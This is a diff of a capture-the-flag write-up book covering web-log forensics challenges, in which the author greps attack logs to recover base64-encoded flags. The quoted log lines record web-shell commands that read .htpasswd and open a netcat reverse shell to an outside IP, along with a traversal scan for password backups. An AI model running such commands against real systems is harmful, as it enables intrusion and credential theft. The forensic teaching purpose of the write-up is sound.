@@ -3176,28 +3176,29 @@ STR : b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00
 37628:2021-09-06 20:46:04 135.233.142.30 GET ywesusnz cmd%3Dcat+%2Fvar%2Fwww%2F.htpasswd 443 - 20.132.161.193 Mozilla/5.0+(compatible;+MSIE+9.0;+Windows+NT+6.0;+Trident/5.0) https://digitaloverdose.tech/ywesusnz 200 0 0 22
 </code></pre>
 <p>We can see that the line number is 37628. So I tried to output 10 lines above and below 37628</p>
-<pre><code>$ strings attack.log| grep  -n -i 'pass' -b10 -a10 
-37618-9504190-2021-09-06 20:45:36 135.233.142.30 GET runtime-es5.43df09c2199138dc23a5.js - 443 - 155.198.11.229 Mozilla/4.0+(compatible;+MSIE+7.0;+Windows+NT+6.1;+WOW64;+Trident/7.0;+SLCC2;+.NET+CLR+2.0.50727;+.NET+CLR+3.5.30729;+.NET+CLR+3.0.30729;+Media+Center+PC+6.0;+.NET4.0C;+.NET4.0E) https://digitaloverdose.tech/dovercon/schedule-edition-2021 200 0 0 23
-37619-9504538-2021-09-06 20:45:36 135.233.142.30 GET dovercon/sponsoring-edition-2021 - 443 - 155.198.11.229 Mozilla/4.0+(compatible;+MSIE+7.0;+Windows+NT+6.1;+WOW64;+Trident/7.0;+SLCC2;+.NET+CLR+2.0.50727;+.NET+CLR+3.5.30729;+.NET+CLR+3.0.30729;+Media+Center+PC+6.0;+.NET4.0C;+.NET4.0E) https://digitaloverdose.tech/dovercon/schedule-edition-2021 200 0 0 23
-37620-9504883-2021-09-06 20:45:46 135.233.142.30 GET ywesusnz cmd%3Dnetstat+-peanut 443 - 20.132.161.193 Mozilla/5.0+(compatible;+MSIE+9.0;+Windows+NT+6.0;+Trident/5.0) https://digitaloverdose.tech/ywesusnz 200 0 0 21
-37621-9505087-2021-09-06 20:45:47 135.233.142.30 GET cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js - 443 - 155.198.11.229 Mozilla/4.0+(compatible;+MSIE+7.0;+Windows+NT+6.1;+WOW64;+Trident/7.0;+SLCC2;+.NET+CLR+2.0.50727;+.NET+CLR+3.5.30729;+.NET+CLR+3.0.30729;+Media+Center+PC+6.0;+.NET4.0C;+.NET4.0E) https://digitaloverdose.tech/dovercon/sponsoring-edition-2021 200 0 0 27
-37622-9505464-2021-09-06 20:45:47 135.233.142.30 GET main-es5.5dfab9e1774faff15645.js - 443 - 155.198.11.229 Mozilla/4.0+(compatible;+MSIE+7.0;+Windows+NT+6.1;+WOW64;+Trident/7.0;+SLCC2;+.NET+CLR+2.0.50727;+.NET+CLR+3.5.30729;+.NET+CLR+3.0.30729;+Media+Center+PC+6.0;+.NET4.0C;+.NET4.0E) https://digitaloverdose.tech/dovercon/sponsoring-edition-2021 200 0 0 29
-37623-9505811-2021-09-06 20:45:47 135.233.142.30 GET 6-es2015.2c367e3b65026d7698d3.js - 443 - 155.198.11.229 Mozilla/4.0+(compatible;+MSIE+7.0;+Windows+NT+6.1;+WOW64;+Trident/7.0;+SLCC2;+.NET+CLR+2.0.50727;+.NET+CLR+3.5.30729;+.NET+CLR+3.0.30729;+Media+Center+PC+6.0;+.NET4.0C;+.NET4.0E) https://digitaloverdose.tech/dovercon/sponsoring-edition-2021 200 0 0 21
-37624-9506158-2021-09-06 20:45:47 135.233.142.30 GET ctf/about - 443 - 155.198.11.229 Mozilla/4.0+(compatible;+MSIE+7.0;+Windows+NT+6.1;+WOW64;+Trident/7.0;+SLCC2;+.NET+CLR+2.0.50727;+.NET+CLR+3.5.30729;+.NET+CLR+3.0.30729;+Media+Center+PC+6.0;+.NET4.0C;+.NET4.0E) https://digitaloverdose.tech/dovercon/sponsoring-edition-2021 200 0 0 20
-37625-9506482-2021-09-06 20:45:59 135.233.142.30 GET assets/images/ctf/2021-autumn/ractf_logo.svg - 443 - 155.198.11.229 Mozilla/4.0+(compatible;+MSIE+7.0;+Windows+NT+6.1;+WOW64;+Trident/7.0;+SLCC2;+.NET+CLR+2.0.50727;+.NET+CLR+3.5.30729;+.NET+CLR+3.0.30729;+Media+Center+PC+6.0;+.NET4.0C;+.NET4.0E) https://digitaloverdose.tech/ctf/about 200 0 0 20
-37626-9506818-2021-09-06 20:45:59 135.233.142.30 GET 8-es2015.9f210c2bd083cdacb0ee.js - 443 - 155.198.11.229 Mozilla/4.0+(compatible;+MSIE+7.0;+Windows+NT+6.1;+WOW64;+Trident/7.0;+SLCC2;+.NET+CLR+2.0.50727;+.NET+CLR+3.5.30729;+.NET+CLR+3.0.30729;+Media+Center+PC+6.0;+.NET4.0C;+.NET4.0E) https://digitaloverdose.tech/ctf/about 200 0 0 26
-37627-9507142-2021-09-06 20:45:59 135.233.142.30 GET dovercon/speakers-edition-2021 - 443 - 155.198.11.229 Mozilla/4.0+(compatible;+MSIE+7.0;+Windows+NT+6.1;+WOW64;+Trident/7.0;+SLCC2;+.NET+CLR+2.0.50727;+.NET+CLR+3.5.30729;+.NET+CLR+3.0.30729;+Media+Center+PC+6.0;+.NET4.0C;+.NET4.0E) https://digitaloverdose.tech/ctf/about 200 0 0 21
-37628:9507464:2021-09-06 20:46:04 135.233.142.30 GET ywesusnz cmd%3Dcat+%2Fvar%2Fwww%2F.htpasswd 443 - 20.132.161.193 Mozilla/5.0+(compatible;+MSIE+9.0;+Windows+NT+6.0;+Trident/5.0) https://digitaloverdose.tech/ywesusnz 200 0 0 22
-37629-9507681-2021-09-06 20:46:12 135.233.142.30 GET ywesusnz cmd%3Dcat+RE97YmV0dGVyX3JlbW92ZV90aGF0X2JhY2tkb29yfQ== 443 - 20.132.161.193 Mozilla/5.0+(compatible;+MSIE+9.0;+Windows+NT+6.0;+Trident/5.0) https://digitaloverdose.tech/ywesusnz 200 0 0 26
-37630-9507918-2021-09-06 20:46:19 135.233.142.30 GET ywesusnz cmd%3Dnc+-e+%2Fbin%2Fsh+207.35.160.84+4213 443 - 20.132.161.193 Mozilla/5.0+(compatible;+MSIE+9.0;+Windows+NT+6.0;+Trident/5.0) https://digitaloverdose.tech/ywesusnz 200 0 0 20
-37631-9508143-2021-09-06 20:48:00 135.233.142.30 GET cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js - 443 - 185.159.245.168 Mozilla/4.0+(compatible;+MSIE+6.0;+Windows+NT+5.1) - 200 0 0 22
-37632-9508333-2021-09-06 20:48:00 135.233.142.30 GET 8-es2015.9f210c2bd083cdacb0ee.js - 443 - 185.159.245.168 Mozilla/4.0+(compatible;+MSIE+6.0;+Windows+NT+5.1) - 200 0 0 21
-37633-9508493-2021-09-06 20:48:00 135.233.142.30 GET cdn-cgi/l/email-protection - 443 - 185.159.245.168 Mozilla/4.0+(compatible;+MSIE+6.0;+Windows+NT+5.1) - 200 0 0 28
-37634-9508647-2021-09-06 20:48:00 135.233.142.30 GET privacy - 443 - 185.159.245.168 Mozilla/4.0+(compatible;+MSIE+6.0;+Windows+NT+5.1) - 200 0 0 25
-37635-9508782-2021-09-06 20:48:00 135.233.142.30 GET main-es5.5dfab9e1774faff15645.js - 443 - 185.227.109.194 Mozilla/5.0+(iPhone;+CPU+iPhone+OS+12_3_1+like+Mac+OS+X)+AppleWebKit/605.1.15+(KHTML,+like+Gecko)+Mobile/15E148+Webkit+based+browser - 200 0 0 25
-37636-9509024-2021-09-06 20:48:00 135.233.142.30 GET polyfills-es2015.891d5b00ef96a8ae9449.js - 443 - 185.227.109.194 Mozilla/5.0+(iPhone;+CPU+iPhone+OS+12_3_1+like+Mac+OS+X)+AppleWebKit/605.1.15+(KHTML,+like+Gecko)+Mobile/15E148+Webkit+based+browser - 200 0 0 22
-37637-9509274-2021-09-06 20:48:00 135.233.142.30 GET dovercon/2021/mentors - 443 - 185.227.109.194 Mozilla/5.0+(iPhone;+CPU+iPhone+OS+12_3_1+like+Mac+OS+X)+AppleWebKit/605.1.15+(KHTML,+like+Gecko)+Mobile/15E148+Webkit+based+browser - 200 0 0 29
-37638-9509505-2021-09-06 20:48:00 135.233.142.30 GET cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js - 443 - 54.192.35.96 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/81.0.4044.138+Safari/537.36 - 200 0 0 20
+<pre><code>$ strings attack.log| grep  -n -i 'pass' -B10 -A10 
+37618-2021-09-06 20:45:36 135.233.142.30 GET runtime-es5.43df09c2199138dc23a5.js - 443 - 155.198.11.229 Mozilla/4.0+(compatible;+MSIE+7.0;+Windows+NT+6.1;+WOW64;+Trident/7.0;+SLCC2;+.NET+CLR+2.0.50727;+.NET+CLR+3.5.30729;+.NET+CLR+3.0.30729;+Media+Center+PC+6.0;+.NET4.0C;+.NET4.0E) https://digitaloverdose.tech/dovercon/schedule-edition-2021 200 0 0 23
+37619-2021-09-06 20:45:36 135.233.142.30 GET dovercon/sponsoring-edition-2021 - 443 - 155.198.11.229 Mozilla/4.0+(compatible;+MSIE+7.0;+Windows+NT+6.1;+WOW64;+Trident/7.0;+SLCC2;+.NET+CLR+2.0.50727;+.NET+CLR+3.5.30729;+.NET+CLR+3.0.30729;+Media+Center+PC+6.0;+.NET4.0C;+.NET4.0E) https://digitaloverdose.tech/dovercon/schedule-edition-2021 200 0 0 23
+37620-2021-09-06 20:45:46 135.233.142.30 GET ywesusnz cmd%3Dnetstat+-peanut 443 - 20.132.161.193 Mozilla/5.0+(compatible;+MSIE+9.0;+Windows+NT+6.0;+Trident/5.0) https://digitaloverdose.tech/ywesusnz 200 0 0 21
+37621-2021-09-06 20:45:47 135.233.142.30 GET cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js - 443 - 155.198.11.229 Mozilla/4.0+(compatible;+MSIE+7.0;+Windows+NT+6.1;+WOW64;+Trident/7.0;+SLCC2;+.NET+CLR+2.0.50727;+.NET+CLR+3.5.30729;+.NET+CLR+3.0.30729;+Media+Center+PC+6.0;+.NET4.0C;+.NET4.0E) https://digitaloverdose.tech/dovercon/sponsoring-edition-2021 200 0 0 27
+37622-2021-09-06 20:45:47 135.233.142.30 GET main-es5.5dfab9e1774faff15645.js - 443 - 155.198.11.229 Mozilla/4.0+(compatible;+MSIE+7.0;+Windows+NT+6.1;+WOW64;+Trident/7.0;+SLCC2;+.NET+CLR+2.0.50727;+.NET+CLR+3.5.30729;+.NET+CLR+3.0.30729;+Media+Center+PC+6.0;+.NET4.0C;+.NET4.0E) https://digitaloverdose.tech/dovercon/sponsoring-edition-2021 200 0 0 29
+37623-2021-09-06 20:45:47 135.233.142.30 GET 6-es2015.2c367e3b65026d7698d3.js - 443 - 155.198.11.229 Mozilla/4.0+(compatible;+MSIE+7.0;+Windows+NT+6.1;+WOW64;+Trident/7.0;+SLCC2;+.NET+CLR+2.0.50727;+.NET+CLR+3.5.30729;+.NET+CLR+3.0.30729;+Media+Center+PC+6.0;+.NET4.0C;+.NET4.0E) https://digitaloverdose.tech/dovercon/sponsoring-edition-2021 200 0 0 21
+37624-2021-09-06 20:45:47 135.233.142.30 GET ctf/about - 443 - 155.198.11.229 Mozilla/4.0+(compatible;+MSIE+7.0;+Windows+NT+6.1;+WOW64;+Trident/7.0;+SLCC2;+.NET+CLR+2.0.50727;+.NET+CLR+3.5.30729;+.NET+CLR+3.0.30729;+Media+Center+PC+6.0;+.NET4.0C;+.NET4.0E) https://digitaloverdose.tech/dovercon/sponsoring-edition-2021 200 0 0 20
+37625-2021-09-06 20:45:59 135.233.142.30 GET assets/images/ctf/2021-autumn/ractf_logo.svg - 443 - 155.198.11.229 Mozilla/4.0+(compatible;+MSIE+7.0;+Windows+NT+6.1;+WOW64;+Trident/7.0;+SLCC2;+.NET+CLR+2.0.50727;+.NET+CLR+3.5.30729;+.NET+CLR+3.0.30729;+Media+Center+PC+6.0;+.NET4.0C;+.NET4.0E) https://digitaloverdose.tech/ctf/about 200 0 0 20
+37626-2021-09-06 20:45:59 135.233.142.30 GET 8-es2015.9f210c2bd083cdacb0ee.js - 443 - 155.198.11.229 Mozilla/4.0+(compatible;+MSIE+7.0;+Windows+NT+6.1;+WOW64;+Trident/7.0;+SLCC2;+.NET+CLR+2.0.50727;+.NET+CLR+3.5.30729;+.NET+CLR+3.0.30729;+Media+Center+PC+6.0;+.NET4.0C;+.NET4.0E) https://digitaloverdose.tech/ctf/about 200 0 0 26
+37627-2021-09-06 20:45:59 135.233.142.30 GET dovercon/speakers-edition-2021 - 443 - 155.198.11.229 Mozilla/4.0+(compatible;+MSIE+7.0;+Windows+NT+6.1;+WOW64;+Trident/7.0;+SLCC2;+.NET+CLR+2.0.50727;+.NET+CLR+3.5.30729;+.NET+CLR+3.0.30729;+Media+Center+PC+6.0;+.NET4.0C;+.NET4.0E) https://digitaloverdose.tech/ctf/about 200 0 0 21
+37628:2021-09-06 20:46:04 135.233.142.30 GET ywesusnz cmd%3Dcat+%2Fvar%2Fwww%2F.htpasswd 443 - 20.132.161.193 Mozilla/5.0+(compatible;+MSIE+9.0;+Windows+NT+6.0;+Trident/5.0) https://digitaloverdose.tech/ywesusnz 200 0 0 22
+37629-2021-09-06 20:46:12 135.233.142.30 GET ywesusnz cmd%3Dcat+RE97YmV0dGVyX3JlbW92ZV90aGF0X2JhY2tkb29yfQ== 443 - 20.132.161.193 Mozilla/5.0+(compatible;+MSIE+9.0;+Windows+NT+6.0;+Trident/5.0) https://digitaloverdose.tech/ywesusnz 200 0 0 26
+37630-2021-09-06 20:46:19 135.233.142.30 GET ywesusnz cmd%3Dnc+-e+%2Fbin%2Fsh+207.35.160.84+4213 443 - 20.132.161.193 Mozilla/5.0+(compatible;+MSIE+9.0;+Windows+NT+6.0;+Trident/5.0) https://digitaloverdose.tech/ywesusnz 200 0 0 20
+37631-2021-09-06 20:48:00 135.233.142.30 GET cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js - 443 - 185.159.245.168 Mozilla/4.0+(compatible;+MSIE+6.0;+Windows+NT+5.1) - 200 0 0 22
+37632-2021-09-06 20:48:00 135.233.142.30 GET 8-es2015.9f210c2bd083cdacb0ee.js - 443 - 185.159.245.168 Mozilla/4.0+(compatible;+MSIE+6.0;+Windows+NT+5.1) - 200 0 0 21
+37633-2021-09-06 20:48:00 135.233.142.30 GET cdn-cgi/l/email-protection - 443 - 185.159.245.168 Mozilla/4.0+(compatible;+MSIE+6.0;+Windows+NT+5.1) - 200 0 0 28
+37634-2021-09-06 20:48:00 135.233.142.30 GET privacy - 443 - 185.159.245.168 Mozilla/4.0+(compatible;+MSIE+6.0;+Windows+NT+5.1) - 200 0 0 25
+37635-2021-09-06 20:48:00 135.233.142.30 GET main-es5.5dfab9e1774faff15645.js - 443 - 185.227.109.194 Mozilla/5.0+(iPhone;+CPU+iPhone+OS+12_3_1+like+Mac+OS+X)+AppleWebKit/605.1.15+(KHTML,+like+Gecko)+Mobile/15E148+Webkit+based+browser - 200 0 0 25
+37636-2021-09-06 20:48:00 135.233.142.30 GET polyfills-es2015.891d5b00ef96a8ae9449.js - 443 - 185.227.109.194 Mozilla/5.0+(iPhone;+CPU+iPhone+OS+12_3_1+like+Mac+OS+X)+AppleWebKit/605.1.15+(KHTML,+like+Gecko)+Mobile/15E148+Webkit+based+browser - 200 0 0 22
+37637-2021-09-06 20:48:00 135.233.142.30 GET dovercon/2021/mentors - 443 - 185.227.109.194 Mozilla/5.0+(iPhone;+CPU+iPhone+OS+12_3_1+like+Mac+OS+X)+AppleWebKit/605.1.15+(KHTML,+like+Gecko)+Mobile/15E148+Webkit+based+browser - 200 0 0 29
+37638-2021-09-06 20:48:00 135.233.142.30 GET cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js - 443 - 54.192.35.96 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/81.0.4044.138+Safari/537.36 - 200 0 0 20
+
 </code></pre>
 <p>I saw that line 37629 had some base64 encoded text. Deciphring this I retrived the flag</p>
 <pre><code>DO{better_remove_that_backdoor}
@@ -3211,7 +3212,7 @@ STR : b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00
 <p><img src="https://raw.githubusercontent.com/0x41head/CTF-Writeups/main/src/DOA2021ctf/Log%20Analysis/Investigation/ques.png" alt="question" /></p>
 <h2 id="solution-41"><a class="header" href="#solution-41">Solution:</a></h2>
 <p>This challenge came along with <code>more.7z</code> file which when extracted gave me <code>more.log</code>.</p>
-<p>Similar to <a href="DOA2021ctf/Log%20Analysis/Investigation/">Ingress</a>,I tried usign grep to find specific words in the log</p>
+<p>Similar to <a href="https://0x41head.github.io/CTF-Writeups/book/DOA2021ctf/Log%20Analysis/Ingress/Ingress.html">Ingress</a>,I tried usign grep to find specific words in the log</p>
 <pre><code>$ strings more.log | grep -i 'pass'
 2021-08-03 08:55:00 45.85.1.176 GET ../..//passwords.bckp - 443 - 200.13.84.124 Mozilla/5.0+(Windows+NT+5.1;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/60.0.3112.90+Safari/537.36 - 404 0 0 27
 2021-08-03 08:55:00 45.85.1.176 GET archives/passwords.txt - 443 - 200.13.84.124 Mozilla/5.0+(Windows+NT+5.1;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/60.0.3112.90+Safari/537.36 - 404 0 0 21
@@ -3258,7 +3259,71 @@ STR : b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00
 <p>https://www.joeldare.com/wiki/linux:grep_a_range_of_lines</p>
 <h3 id="tags-41"><a class="header" href="#tags-41">Tags:</a></h3>
 <p><code>Log</code> <code>Analysis</code> </p>
-<div style="break-before: page; page-break-before: always;"></div>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="problem-statement-42"><a class="header" href="#problem-statement-42">Problem Statement:</a></h1>
+<p><img src="https://raw.githubusercontent.com/0x41head/CTF-Writeups/main/src/DOA2021ctf/Log%20Analysis/Backup%20Policy/ques.png" alt="question" /></p>
+<h2 id="solution-42"><a class="header" href="#solution-42">Solution:</a></h2>
+<p>This challenge came along with <code>more.7z</code> file which when extracted gave me <code>more.log</code>.</p>
+<p>Similar to <a href="https://0x41head.github.io/CTF-Writeups/book/DOA2021ctf/Log%20Analysis/Ingress/Ingress.html">Ingress</a> and <a href="https://0x41head.github.io/CTF-Writeups/book/DOA2021ctf/Log%20Analysis/Investigation/Investigation.html">Investigation</a>,I tried usign grep to find specific words in the log</p>
+<pre><code>$ strings more.log | grep -i 'pass'
+2021-08-03 08:55:00 45.85.1.176 GET ../..//passwords.bckp - 443 - 200.13.84.124 Mozilla/5.0+(Windows+NT+5.1;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/60.0.3112.90+Safari/537.36 - 404 0 0 27
+2021-08-03 08:55:00 45.85.1.176 GET archives/passwords.txt - 443 - 200.13.84.124 Mozilla/5.0+(Windows+NT+5.1;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/60.0.3112.90+Safari/537.36 - 404 0 0 21
+2021-08-03 08:55:00 45.85.1.176 GET passwords.tgz - 443 - 200.13.84.124 Mozilla/5.0+(Windows+NT+5.1;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/60.0.3112.90+Safari/537.36 - 404 0 0 21
+2021-08-03 08:55:00 45.85.1.176 GET backup/passwords.old - 443 - 200.13.84.124 Mozilla/5.0+(Windows+NT+5.1;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/60.0.3112.90+Safari/537.36 - 404 0 0 23
+2021-08-03 08:55:00 45.85.1.176 GET 2/passwords.archived - 443 - 200.13.84.124 Mozilla/5.0+(Windows+NT+5.1;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/60.0.3112.90+Safari/537.36 - 404 0 0 24
+2021-08-03 08:55:00 45.85.1.176 GET 4/passwords.copy - 443 - 200.13.84.124 Mozilla/5.0+(Windows+NT+5.1;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/60.0.3112.90+Safari/537.36 - 404 0 0 24
+2021-08-03 08:55:00 45.85.1.176 GET 2/passwords.7z - 443 - 200.13.84.124 Mozilla/5.0+(Windows+NT+5.1;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/60.0.3112.90+Safari/537.36 - 404 0 0 26
+2021-08-03 08:55:00 45.85.1.176 GET 4/passwords.7z - 443 - 200.13.84.124 Mozilla/5.0+(Windows+NT+5.1;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/60.0.3112.90+Safari/537.36 - 404 0 0 20
+2021-08-03 08:55:00 45.85.1.176 GET 1/passwords.archived - 443 - 200.13.84.124 Mozilla/5.0+(Windows+NT+5.1;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/60.0.3112.90+Safari/537.36 - 404 0 0 28
+2021-08-03 08:55:00 45.85.1.176 GET 1/passwords.archived - 443 - 200.13.84.124 Mozilla/5.0+(Windows+NT+5.1;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/60.0.3112.90+Safari/537.36 - 404 0 0 21
+2021-08-03 08:55:08 45.85.1.176 GET 3/passwords.txt - 443 - 200.13.84.124 Mozilla/5.0+(Windows+NT+5.1;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/60.0.3112.90+Safari/537.36 - 404 0 0 23
+2021-08-03 08:55:08 45.85.1.176 GET 3/passwords.tgz - 443 - 200.13.84.124 Mozilla/5.0+(Windows+NT+5.1;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/60.0.3112.90+Safari/537.36 - 404 0 0 29
+2021-08-03 08:55:08 45.85.1.176 GET passwords.backup - 443 - 200.13.84.124 Mozilla/5.0+(Windows+NT+5.1;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/60.0.3112.90+Safari/537.36 - 404 0 0 28
+2021-08-03 08:55:08 45.85.1.176 GET 4/passwords.zip - 443 - 200.13.84.124 Mozilla/5.0+(Windows+NT+5.1;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/60.0.3112.90+Safari/537.36 - 404 0 0 24
+2021-08-03 08:55:08 45.85.1.176 GET ../../..//passwords.tgz - 443 - 200.13.84.124 Mozilla/5.0+(Windows+NT+5.1;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/60.0.3112.90+Safari/537.36 - 404 0 0 21
+2021-08-03 08:55:08 45.85.1.176 GET old/passwords.txt - 443 - 200.13.84.124 Mozilla/5.0+(Windows+NT+5.1;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/60.0.3112.90+Safari/537.36 - 404 0 0 20
+2021-08-03 08:55:08 45.85.1.176 GET 2/passwords.copy.copy - 443 - 200.13.84.124 Mozilla/5.0+(Windows+NT+5.1;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/60.0.3112.90+Safari/537.36 - 404 0 0 23
+2021-08-03 08:55:08 45.85.1.176 GET backup/passwords.copy - 443 - 200.13.84.124 Mozilla/5.0+(Windows+NT+5.1;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/60.0.3112.90+Safari/537.36 - 404 0 0 30
+2021-08-03 08:55:08 45.85.1.176 GET 2/passwords.backup - 443 - 200.13.84.124 Mozilla/5.0+(Windows+NT+5.1;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/60.0.3112.90+Safari/537.36 - 404 0 0 23
+2021-08-03 08:55:08 45.85.1.176 GET backup/passwords.2 - 443 - 200.13.84.124 Mozilla/5.0+(Windows+NT+5.1;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/60.0.3112.90+Safari/537.36 - 404 0 0 27
+2021-08-03 08:55:08 45.85.1.176 GET backup/passwords.7z - 443 - 200.13.84.124 Mozilla/5.0+(Windows+NT+5.1;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/60.0.3112.90+Safari/537.36 - 404 0 0 26
+2021-08-03 08:55:08 45.85.1.176 GET 1/passwords.copy - 443 - 200.13.84.124 Mozilla/5.0+(Windows+NT+5.1;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/60.0.3112.90+Safari/537.36 - 404 0 0 23
+2021-08-03 08:55:08 45.85.1.176 GET ../../..//passwords.old - 443 - 200.13.84.124 Mozilla/5.0+(Windows+NT+5.1;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/60.0.3112.90+Safari/537.36 - 404 0 0 29
+2021-08-03 08:55:08 45.85.1.176 GET passwords.zip - 443 - 200.13.84.124 Mozilla/5.0+(Windows+NT+5.1;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/60.0.3112.90+Safari/537.36 - 404 0 0 30
+2021-08-03 08:55:08 45.85.1.176 GET archives/passwords.zip - 443 - 200.13.84.124 Mozilla/5.0+(Windows+NT+5.1;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/60.0.3112.90+Safari/537.36 - 404 0 0 26
+2021-08-03 08:55:08 45.85.1.176 GET ../../..//passwords.txt - 443 - 200.13.84.124 Mozilla/5.0+(Windows+NT+5.1;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/60.0.3112.90+Safari/537.36 - 404 0 0 27
+2021-08-03 08:55:08 45.85.1.176 GET archives/passwords.2 - 443 - 200.13.84.124 Mozilla/5.0+(Windows+NT+5.1;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/60.0.3112.90+Safari/537.36 - 404 0 0 21
+2021-08-03 08:55:08 45.85.1.176 GET 4/passwords.old - 443 - 200.13.84.124 Mozilla/5.0+(Windows+NT+5.1;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/60.0.3112.90+Safari/537.36 - 404 0 0 25
+2021-08-03 08:55:08 45.85.1.176 GET ../../..//passwords.7z - 443 - 200.13.84.124 Mozilla/5.0+(Windows+NT+5.1;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/60.0.3112.90+Safari/537.36 - 404 0 0 21
+2021-08-03 08:55:08 45.85.1.176 GET 1/passwords.archived - 443 - 200.13.84.124 Mozilla/5.0+(Windows+NT+5.1;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/60.0.3112.90+Safari/537.36 - 404 0 0 23
+2021-08-03 08:55:08 45.85.1.176 GET passwords.old - 443 - 200.13.84.124 Mozilla/5.0+(Windows+NT+5.1;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/60.0.3112.90+Safari/537.36 - 404 0 0 25
+2021-08-03 08:55:08 45.85.1.176 GET admin/passwords.old - 443 - 200.13.84.124 Mozilla/5.0+(Windows+NT+5.1;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/60.0.3112.90+Safari/537.36 - 404 0 0 23
+2021-08-03 08:55:08 45.85.1.176 GET admin/passwords.1 - 443 - 200.13.84.124 Mozilla/5.0+(Windows+NT+5.1;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/60.0.3112.90+Safari/537.36 - 404 0 0 29
+2021-08-03 08:55:08 45.85.1.176 GET 4/passwords.3 - 443 - 200.13.84.124 Mozilla/5.0+(Windows+NT+5.1;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/60.0.3112.90+Safari/537.36 - 404 0 0 29
+2021-08-03 08:55:08 45.85.1.176 GET passwords.3 - 443 - 200.13.84.124 Mozilla/5.0+(Windows+NT+5.1;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/60.0.3112.90+Safari/537.36 - 404 0 0 28
+
+
+</code></pre>
+<p>The line numbers in the above output made me believe that the log of the attack was present in one big cluster.</p>
+<p>After some trial and error and messing around a bit I found out that he attack took place from line 12630 to line 13193</p>
+<p>The question states that I needed to find if the attacker got a backup. We can see that most of the time the attacker was getting back the
+404 HTTP resopnse. </p>
+<p>So taking all of that into consideration, I first output the required part of the log into a seperate file.</p>
+<pre><code>$ strings more.log | grep -n  'old/.htaccess.saved' -B0 -A563  &gt;out.txt
+</code></pre>
+<p>Then I gused grep on the file to find all the logs that returned 200 Status code</p>
+<pre><code>strings out.txt| grep -i ' - 200 '
+12752-2021-08-03 08:55:00 45.85.1.176 GET backup.zip - 443 - 200.13.84.124 Mozilla/5.0+(Windows+NT+5.1;+RE97czNjcjN0X19fYWdlbnR9;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/60.0.3112.90+Safari/537.36 - 200 0 0 25
+</code></pre>
+<p>Here, I found a base64 string
+Decoding that gave me the flag</p>
+<pre><code>DO{s3cr3t___agent}
+</code></pre>
+<h3 id="notes-42"><a class="header" href="#notes-42">Notes:</a></h3>
+<h3 id="reference-42"><a class="header" href="#reference-42">Reference:</a></h3>
+<p>https://www.joeldare.com/wiki/linux:grep_a_range_of_lines</p>
+<h3 id="tags-42"><a class="header" href="#tags-42">Tags:</a></h3>
+<p><code>Log</code> <code>Analysis</code> </p>
+
                     </main>
 
                     <nav class="nav-wrapper" aria-label="Page navigation">
